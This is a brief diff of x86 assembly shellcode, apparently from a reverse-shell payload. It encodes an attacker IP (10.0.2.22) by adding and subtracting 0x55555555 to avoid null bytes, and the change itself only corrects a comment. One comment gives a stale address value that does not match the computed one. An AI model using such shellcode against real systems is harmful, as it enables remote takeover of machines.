@@ -20,7 +20,7 @@ mov ebx,0x6B57555F      ; Change if needed! Attacker IP: 10.0.2.22. In reverse o
                         ; hex(2) = 0x02
                         ; hex(0) = 0x00
                         ; hex(10) = 0x0a
-                        ; 0x1602000a + 55555555 = 6B57555F
+                        ; 0x1602000a + 0x55555555 = 0x6B57555F
 sub ebx,0x55555555      ; Substract again 55555555 to get the original IP
 push ebx                ; This will push 0x1400a8c0 to the stack without
                         ; injecting null bytes
